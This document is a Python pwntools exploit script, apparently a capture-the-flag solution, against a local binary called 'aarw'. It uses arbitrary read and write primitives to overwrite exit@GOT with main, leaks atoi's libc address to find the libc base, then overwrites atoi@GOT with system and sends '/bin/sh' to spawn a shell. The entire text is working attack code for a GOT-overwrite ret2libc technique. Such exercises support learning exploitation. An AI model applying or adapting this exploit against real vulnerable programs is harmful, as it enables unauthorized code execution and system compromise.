#!/usr/bin/env python3
from pwn import *

bin_file = './aarw'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_got_atoi    = binf.got['atoi']                # 0x403470
addr_got_exit    = binf.got['exit']                # 0x403480
addr_main        = binf.functions['main'].address  # 0x4011b1

libc = binf.libc
offset_libc_atoi = libc.functions['atoi'].address  # 0x047730

def attack(conn, **kwargs):
    aaw(conn, addr_got_exit, addr_main)

    addr_libc_atoi = aar(conn, addr_got_atoi)
    libc.address = addr_libc_atoi - offset_libc_atoi
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.functions['system'].address

    aaw(conn, addr_got_atoi, addr_libc_system)
    conn.sendlineafter('>> ', '/bin/sh\x00')

def aar(conn, addr):
    conn.sendlineafter('>> ', '1')
    conn.sendlineafter('read >> ', hex(addr))
    conn.recvuntil(' : ')
    return int(conn.recvuntil('\n', drop=True), 16)

def aaw(conn, addr, val):
    conn.sendlineafter('>> ', '2')
    conn.sendlineafter('write >> ', hex(addr))
    conn.sendlineafter('value >> ', hex(val))

def main():
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
